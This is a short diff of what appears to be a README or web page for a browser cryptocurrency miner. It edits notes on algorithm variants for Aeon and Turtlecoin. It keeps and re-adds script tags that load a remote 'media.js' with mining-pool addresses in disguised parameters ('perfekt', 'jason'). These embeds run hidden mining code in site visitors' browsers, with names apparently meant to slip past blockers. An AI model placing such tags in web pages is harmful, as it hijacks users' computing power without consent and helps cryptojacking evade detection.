@@ -14,9 +14,10 @@ Attention: Stellite and IPBC created their own PoW variants....so mining is disa
 <br><br>
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=1?jason=pool.intensecoin.com:3333" > </script>
 <br><br>
-Attention: Special Case for some custom variant fork coins: Aeon & Turtlecoin need ?algo=cn-lite?variant=1
+Attention: Special Case for some custom cn-lite variant fork coins: Aeon & Turtlecoin need ?algo=cn-lite?variant=1
 <br><br>
-<script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=1?jason=mine.supportaeon.com:3333" > </script><br>
+<script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=1?jason=mine.supportaeon.com:3333" > </script>
+<br><br>
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=1?jason=Pool.TRTL.CryptoPool.Space:5555" > </script>
 
 <br><br> 
